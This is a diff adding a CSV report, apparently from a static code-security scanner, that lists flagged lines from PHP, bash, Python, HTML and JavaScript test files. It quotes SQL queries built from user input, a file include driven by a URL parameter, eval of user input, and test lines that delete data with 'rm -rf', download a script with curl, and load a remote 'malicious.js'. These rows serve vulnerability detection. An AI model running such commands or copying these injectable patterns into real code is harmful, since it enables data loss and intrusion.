@@ -1,0 +1,122 @@
+Fichier,Langage,Ligne,Catégorie,Contenu
+../testfile/authcyber.php,php,13,User entry,"$login=$_POST[""login""];"
+../testfile/authcyber.php,php,14,User entry,"$mdptmp=explode(""%!"",$_POST[""mdp""]);"
+../testfile/authcyber.php,php,20,User entry,"if(isset($_POST[""action""]))"
+../testfile/authcyber.php,php,21,User entry,"$action=$_POST[""action""];"
+../testfile/authcyber.php,php,23,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',strip_tags($_POST[""site""]));"
+../testfile/authcyber.php,php,34,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/authcyber.php,php,36,Unprepared statement,"$reponse = $bdd->query(""select passwd,CyberboxIdClient from wybotidentifiant WHERE CyberboxIdClient='$loginfinal' AND site='$site' AND actif='1' limit 1"");"
+../testfile/authcyber.php,php,59,Unprepared statement,"$reponse2 = $bdd->query(""UPDATE Tokencyberbox SET timestamprenew='$timestamplinux', Token='$uniqueid', site='$site'  WHERE CyberboxIdClient='$idcyber' AND site='$site'"");"
+../testfile/authcyber.php,php,72,Unprepared statement,"$reponse2 = $bdd->query(""INSERT INTO Tokencyberbox (CyberboxIdClient,Token,timestamprenew,site) VALUES('$idcyber','$uniqueid','$timestamplinux','$site')"");"
+../testfile/authcyber.php,php,83,Unprepared statement,"$reponse2 = $bdd->query(""select Token,timestamprenew from Tokencyberbox WHERE CyberboxIdClient='$idcyber' AND site='$site' limit 1"");"
+../testfile/cyber2.php,php,18,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/cyber2.php,php,19,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
+../testfile/cyber2.php,php,20,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
+../testfile/cyber2.php,php,28,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
+../testfile/cyber2.php,php,30,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/cyber2.php,php,32,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
+../testfile/cyber2.php,php,52,User entry,if(!isset($_FILES['uploadedfile']))
+../testfile/cyber2.php,php,58,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient.txt"";"
+../testfile/cyber2.php,php,62,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyber2.php,php,69,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyber2.php,php,69,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyber2.php,php,92,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/cyber2.php,php,94,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/cyber2.php,php,99,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/cyber2.php,php,101,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/cyberlgl.php,php,16,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/cyberlgl.php,php,17,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
+../testfile/cyberlgl.php,php,18,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
+../testfile/cyberlgl.php,php,26,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
+../testfile/cyberlgl.php,php,29,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/cyberlgl.php,php,30,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
+../testfile/cyberlgl.php,php,55,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient.txt"";"
+../testfile/cyberlgl.php,php,59,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyberlgl.php,php,64,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyberlgl.php,php,64,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/cyberlgl.php,php,88,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/cyberlgl.php,php,90,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/cyberlgl.php,php,95,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/cyberlgl.php,php,97,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/edr-browser.php,php,12,User entry,"if(isset($_GET[""licence""]) && isset($_GET[""uuid""]))"
+../testfile/edr-browser.php,php,15,User entry,"$licence=preg_replace('/[^A-Za-z0-9]/', '',$_GET[""licence""]);"
+../testfile/edr-browser.php,php,16,User entry,"$uuid=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""uuid""]);"
+../testfile/edr-browser.php,php,25,User entry,$fileSize = $_FILES['uploadedfile']['size'];
+../testfile/edr-browser.php,php,31,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/edr-browser.php,php,38,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/edr-browser.php,php,51,System command,"shell_exec(""/home/sysun/script/Browser-edr/Browser-edr.sh /var/www/html/fichiers/"".$licence.""_"".$uuid.""_"".$timestamp."".txt /var/www/html/fichiers/"".$licence.""_"".$uuid.""_"".$timestamp.""_final.txt"");"
+../testfile/nmap.php,php,14,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/nmap.php,php,15,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
+../testfile/nmap.php,php,16,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
+../testfile/nmap.php,php,17,User entry,"$color=preg_replace('/[^a-z]/', '',$_GET['color']);"
+../testfile/nmap.php,php,23,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
+../testfile/nmap.php,php,26,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/nmap.php,php,27,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
+../testfile/nmap.php,php,47,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient-$color.txt"";"
+../testfile/nmap.php,php,51,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
+../testfile/nmap.php,php,57,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/nmap.php,php,57,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/nmap.php,php,82,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/nmap.php,php,84,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/nmap.php,php,89,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/nmap.php,php,91,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/restaure.php,php,13,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
+../testfile/restaure.php,php,16,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/restaure.php,php,17,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
+../testfile/save.php,php,17,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/save.php,php,18,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\@\_]/', '',$_GET['idclient']);"
+../testfile/save.php,php,19,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
+../testfile/save.php,php,32,User entry,if(isset($_GET['idclient']) && isset($_GET['site']))
+../testfile/save.php,php,34,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/save.php,php,36,Unprepared statement,"$reponse = $bdd->query(""select Token from Tokencyberbox WHERE CyberboxIdClient='$idclient' AND Token='$token' LIMIT 1"");"
+../testfile/save.php,php,61,User entry,"$target_path = $target_path .$idclient.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']);"
+../testfile/save.php,php,64,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
+../testfile/save.php,php,69,User entry,$fileSize = $_FILES['uploadedfile']['size'];
+../testfile/save.php,php,73,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/save.php,php,75,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/save.php,php,80,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/save.php,php,82,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/sysmon.php,php,13,User entry,"$licence=preg_replace('/[^A-Za-z0-9]/', '',$_GET[""licence""]);"
+../testfile/sysmon.php,php,14,User entry,"$uuid=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""uuid""]);"
+../testfile/sysmon.php,php,18,File manipulation,"include ""/var/www/bdd.php"";"
+../testfile/sysmon.php,php,20,Unprepared statement,"$reponse = $bdd->query(""select licenceclientaenvoyer from licencewybot WHERE licenceclientaenvoyer='$licence' LIMIT 1"");"
+../testfile/sysmon.php,php,40,User entry,"if(isset($_GET[""licence""]) && isset($_GET[""uuid""]))"
+../testfile/sysmon.php,php,48,User entry,$fileSize = $_FILES['uploadedfile']['size'];
+../testfile/sysmon.php,php,53,User entry,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/sysmon.php,php,53,File manipulation,$fileContent = file_get_contents($_FILES['uploadedfile']['tmp_name']);
+../testfile/sysmon.php,php,77,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/sysmon.php,php,84,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/test_cyber.php,php,16,User entry,"$site=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET[""site""]);"
+../testfile/test_cyber.php,php,17,User entry,"$idclient=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_GET['idclient']);"
+../testfile/test_cyber.php,php,18,User entry,"$token=preg_replace('/[^A-Za-z0-9\-\.\_]/', '',$_POST[""token""]);"
+../testfile/test_cyber.php,php,25,User entry,"if(!isset($_GET[""site""]))"
+../testfile/test_cyber.php,php,32,User entry,"$target_path = $target_path . $ip.""-"".$site.""-"". basename( $_FILES['uploadedfile']['name']).""-$date-$idclient.txt"";"
+../testfile/test_cyber.php,php,35,User entry,$type=mime_content_type($_FILES['uploadedfile']['tmp_name']);
+../testfile/test_cyber.php,php,41,User entry,$fileSize = $_FILES['uploadedfile']['size'];
+../testfile/test_cyber.php,php,46,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/test_cyber.php,php,48,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/test_cyber.php,php,53,User entry,"if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path))"
+../testfile/test_cyber.php,php,55,User entry,"echo ""The file "".  basename( $_FILES['uploadedfile']['name'])."
+../testfile/test_malveillant.php,php,4,User entry,$id = $_GET['id'];
+../testfile/test_malveillant.php,php,16,Unprepared statement,"$result = $conn->query(""SELECT * FROM users WHERE id = '$id'"");"
+../testfile/test_malveillant.php,php,19,System command,"$output = shell_exec(""ls -la"");"
+../testfile/test_malveillant.php,php,22,File manipulation,"file_put_contents(""log.txt"", $output);"
+../testfile/test_malveillant.php,php,25,User entry,include($_GET['page']);
+../testfile/test_malveillant.php,php,25,File manipulation,include($_GET['page']);
+../testfile/test_bash.sh,bash,4,System command,rm -rf /important/data
+../testfile/test_bash.sh,bash,4,File manipulation,rm -rf /important/data
+../testfile/test_bash.sh,bash,7,System command,curl http://example.com/mauvais_script.sh -o /tmp/mal.sh
+../testfile/test_bash.sh,bash,10,User entry,result=$(ls -la)
+../testfile/test_bash.sh,bash,13,User entry,USER_HOME=$HOME
+../testfile/test_bash.sh,bash,15,File manipulation,"echo ""Script terminé"""
+../testfile/test_python.py,python,7,User entry,"user_input = input(""Entrez votre nom : "")"
+../testfile/test_python.py,python,8,User entry,"arg = sys.argv[1] if len(sys.argv) > 1 else """""
+../testfile/test_python.py,python,11,System command,"os.system(""ls -la"")"
+../testfile/test_python.py,python,12,System command,"subprocess.Popen([""echo"", ""Hello""])"
+../testfile/test_python.py,python,15,Unprepared statement,"cursor.execute(""SELECT * FROM users WHERE name = '"" + user_input + ""'"")"
+../testfile/test_python.py,python,18,File manipulation,"with open(""mon_fichier.txt"", ""r"") as f:"
+../testfile/test_python.py,python,23,Weak cryptography,"md5_hash = hashlib.md5(b""motdepasse"").hexdigest()"
+../testfile/testhtml.html,html,6,Inline JS,"<script src=""script.js""></script>"
+../testfile/testhtml.html,html,18,Inline JS,"<script src=""http://example.com/malicious.js""></script>"
+../testfile/testjavascript.js,javascript,2,Hardcoded API key,"const apiKey = ""AIzaSyD-FAKEKEY1234567890abcdef"";"
+../testfile/testjavascript.js,javascript,9,Eval usage,eval(userInput);
